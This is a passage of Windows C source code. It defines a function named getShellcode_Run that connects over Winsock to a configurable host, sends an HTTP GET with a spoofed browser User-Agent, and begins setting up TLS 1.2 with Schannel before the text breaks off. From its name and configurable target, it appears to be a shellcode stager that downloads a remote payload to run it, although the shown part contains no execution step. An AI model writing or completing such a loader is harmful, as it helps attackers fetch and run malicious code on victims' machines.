#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#define SECURITY_WIN32
#include <sspi.h>
#include <schannel.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "secur32.lib")

#define DEFAULT_BUFLEN 4096

// Update these to match your setup
char ip[] = "www.google.com";
char port[] = "443";
char resource[] = "";  // Empty resource for Google homepage

void getShellcode_Run(char* host, char* port, char* resource) {
    WSADATA wsaData;
    SOCKET ConnectSocket = INVALID_SOCKET;
    struct addrinfo *result = NULL, *ptr = NULL, hints;
    char sendbuf[MAX_PATH] = "";
    char recvbuf[DEFAULT_BUFLEN];
    char sslBuf[32768];
    char *encryptedBuf = NULL;
    int iResult;
    int sslBufLen = 0;
    CredHandle hCred;
    CtxtHandle hContext;
    SECURITY_STATUS secStatus;
    SecBuffer bufs[4] = {0};
    SecBufferDesc message = {0};
    char fullResponse[65536] = {0};
    int fullResponseLen = 0;
    int totalSize = 0;

    // Build proper HTTP request with cache-control headers
    sprintf_s(sendbuf, MAX_PATH, 
        "GET /%s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Connection: close\r\n"
        "Cache-Control: no-cache\r\n"
        "Pragma: no-cache\r\n"
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\n"
        "\r\n", 
        resource, host);
    OutputDebugStringA("HTTP Request: ");
    OutputDebugStringA(sendbuf);

    // Initialize Winsock
    OutputDebugStringA("Initializing Winsock...\n");
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        char errorMsg[256];
        sprintf_s(errorMsg, 256, "WSAStartup failed: %d\n", iResult);
        OutputDebugStringA(errorMsg);
        return;
    }
    OutputDebugStringA("Winsock initialized successfully\n");

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // Resolve the server address and port
    OutputDebugStringA("Resolving hostname...\n");
    iResult = getaddrinfo(host, port, &hints, &result);
    if (iResult != 0) {
        char errorMsg[256];
        sprintf_s(errorMsg, 256, "getaddrinfo failed: %d\n", iResult);
        OutputDebugStringA(errorMsg);
        WSACleanup();
        return;
    }
    OutputDebugStringA("Hostname resolved successfully\n");

    // Log resolved IP addresses
    for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
        char ipStr[INET_ADDRSTRLEN];
        struct sockaddr_in *sa = (struct sockaddr_in *)ptr->ai_addr;
        inet_ntop(AF_INET, &(sa->sin_addr), ipStr, INET_ADDRSTRLEN);
        char logMsg[256];
        sprintf_s(logMsg, 256, "Resolved IP: %s\n", ipStr);
        OutputDebugStringA(logMsg);
    }

    // Create socket and connect
    OutputDebugStringA("Creating socket and connecting...\n");
    for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
        if (ConnectSocket == INVALID_SOCKET) {
            char errorMsg[256];
            sprintf_s(errorMsg, 256, "socket failed: %d\n", WSAGetLastError());
            OutputDebugStringA(errorMsg);
            WSACleanup();
            return;
        }

        iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (iResult == SOCKET_ERROR) {
            char errorMsg[256];
            sprintf_s(errorMsg, 256, "connect failed: %d\n", WSAGetLastError());
            OutputDebugStringA(errorMsg);
            closesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;
            continue;
        }
        break;
    }
    freeaddrinfo(result);

    if (ConnectSocket == INVALID_SOCKET) {
        OutputDebugStringA("Unable to connect\n");
        WSACleanup();
        return;
    }
    OutputDebugStringA("Connected to server successfully\n");

    // Initialize SSL
    SCHANNEL_CRED schannelCred = {0};
    schannelCred.dwVersion = SCHANNEL_CRED_VERSION;
    schannelCred.grbitEnabledProtocols = SP_PROT_TLS1_2_CLIENT;  // Force TLS 1.2
